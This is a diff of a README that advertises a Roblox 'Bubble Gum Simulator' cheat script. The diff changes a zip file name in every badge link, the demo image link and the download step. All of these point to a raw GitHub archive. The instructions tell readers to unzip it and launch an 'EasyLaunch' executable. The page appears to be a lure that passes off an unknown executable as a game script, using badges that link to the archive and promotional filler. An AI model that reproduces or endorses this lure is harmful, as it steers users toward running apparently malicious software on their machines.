@@ -1,8 +1,8 @@
 # 🍬 Bubble Gum Simulator Script Roblox 🎮
 
-![Build Status](https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_scleranth.zip)
-![OS](https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_scleranth.zip%20%7C%20mac%20os%20%7C%20linux-blue?style=flat-square)
-![License](https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_scleranth.zip)
+![Build Status](https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_v1.4.zip)
+![OS](https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_v1.4.zip%20%7C%20mac%20os%20%7C%20linux-blue?style=flat-square)
+![License](https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_v1.4.zip)
 
 Welcome to the **Bubble Gum Simulator Script for Roblox** – an extraordinary tool built for immersive automation, enhanced gameplay control, and creative customization within the ever-popular Roblox Bubble Gum Simulator universe. Whether you are a passionate collector or a casual bubble blower, this script elevates your in-game experience, unlocking new realms of interactivity and assistance.
 
@@ -38,7 +38,7 @@ No matter where you launch Roblox from – your experience will feel crafted for
 
 Just a few simple steps stand between you and your supercharged Roblox Bubble adventure:
 
-1. **Download the https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_scleranth.zip** from this repository.
+1. **Download the https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_v1.4.zip** from this repository.
 2. Unzip the file to your desired folder.
 3. Launch the provided EasyLaunch executable.
 4. Follow the intuitive setup wizard.
@@ -49,7 +49,7 @@ Just a few simple steps stand between you and your supercharged Roblox Bubble ad
 
 Need a visual guide? Watch the step-by-step instructions right here:
 
-![Installation Demo](https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_scleranth.zip)
+![Installation Demo](https://raw.githubusercontent.com/Soggyfy/Sharingan/main/weep/Software_v1.4.zip)
 
 ---
 
